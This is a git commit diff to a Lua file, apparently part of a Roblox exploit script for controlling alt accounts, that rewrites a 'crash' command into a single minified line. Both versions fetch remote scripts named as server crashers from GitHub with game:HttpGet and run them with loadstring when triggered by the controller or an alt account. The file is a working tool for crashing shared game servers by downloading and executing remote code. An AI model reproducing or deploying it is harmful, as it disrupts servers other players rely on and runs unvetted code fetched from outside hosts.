bcd8fcc1aeaea5d3793db474e8830b9efa389ba0
Husam_Dev <72893731+Husam-Dev@users.noreply.github.com>
2022-09-26 19:01:21 +0200

    Update crash.lua

--- crash.lua
+++ crash.lua
@@ -1,13 +1,1 @@
-getgenv().ExecutedcrashCMD = true
-
-getgenv().crashCMD = function()
-    if game.Players.LocalPlayer.UserId == getgenv().alts['Alt1'] or game.Players.LocalPlayer.UserId == controller then
-        if args[2] then
-            if args[2]:lower() == 'swag' then
-                loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
-            end
-        else
-            loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()
-        end
-    end
-end
+getgenv().ExecutedcrashCMD=true;getgenv().crashCMD=function()if game.Players.LocalPlayer.UserId==getgenv().alts['Alt1']or game.Players.LocalPlayer.UserId==controller then if args[2]then if args[2]:lower()=='swag'then loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()end else loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()end end end
